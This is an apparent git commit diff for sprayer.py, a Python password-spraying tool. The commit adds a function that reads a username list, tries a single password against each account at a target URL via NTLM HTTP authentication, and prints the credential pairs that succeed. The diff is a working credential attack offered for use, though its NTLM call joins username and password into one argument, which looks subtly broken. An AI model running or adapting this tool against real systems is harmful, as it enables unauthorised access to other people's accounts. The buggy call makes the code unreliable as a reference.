52b5ef6231b7003a31bf6e1ef8bfb228e9215e5f
4nt0n1n0LM <antonino.btc@gmail.com>
2023-01-18 09:48:04 +0100

    changes

--- sprayer.py
+++ sprayer.py
@@ -11,11 +11,29 @@ attackurl = ''
 def usage():
     print("Usage: sprayer.py -u USERS_FILE -f DC_FQDN -p PASSWORD -a URL_TO_ATTACK")
     print("Example: ")
-    print("netsnake.py -u users.txt -f dc.mydomain.com -p password1234 -a http://authForm.mydomain.com/")
+    print("sprayer.py -u users.txt -f dc.mydomain.com -p password1234 -a http://authForm.mydomain.com/")
     sys.exit(0)
 
 def startSpray(userfile, fqdn, password, attackurl):
-    return True
+    
+    HTTP_AUTH_FAIL_CODE = 401
+    HTTP_AUTH_SUCCESS_CODE = 200
+    
+    lines = open(userfile, 'r').readlines()
+    users = [line.replace("\r", "").replace("\n", "") for line in lines]
+    
+    print ("[*] Starting passwords spray attack using the following password: " + password)
+    count = 0
+    
+    for user in users:
+        response = requests.get(attackurl, auth=requests_ntlm.HttpNtlmAuth(fqdn + "\\" + user + password))
+        if(response.status_code == HTTP_AUTH_SUCCESS_CODE):
+            print("[+] Valid credential pair found! Username: " + user + " Password: " + password)
+            count += 1
+            continue
+        if(response.status_code == HTTP_AUTH_FAIL_CODE):
+            print("[-] Failed login with Username: " +user)
+    print("[*] Password spray attack completed, " +str(count)+ " valid credential pairs found")
 
 def main(argv):
     
@@ -27,13 +45,12 @@ def main(argv):
     #Empty command line options print usage and exits
     if not len(sys.argv[1:]):
         usage()
-        sys.exit(0)
         
     #Read commad line options
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "h:u:f:p:a", 
+        opts, args = getopt.getopt(sys.argv[1:], "h:u:f:p:a:", 
                                                 ["help", "userfile=", "fqdn=", "password=", "attackurl="])
-        
+       
         for option, arg in opts:
             
             if option in ("-h", "--help"):
@@ -51,13 +68,11 @@ def main(argv):
             
     except getopt.GetoptError:
         usage()
-        exit(0)
         
     if (len(userfile) and len(fqdn) and len(password) and len(attackurl)):
         startSpray(userfile, fqdn, password, attackurl)
         sys.exit(0)
     else:
         usage()
-        sys.exit(0)
 
 main(sys.argv)
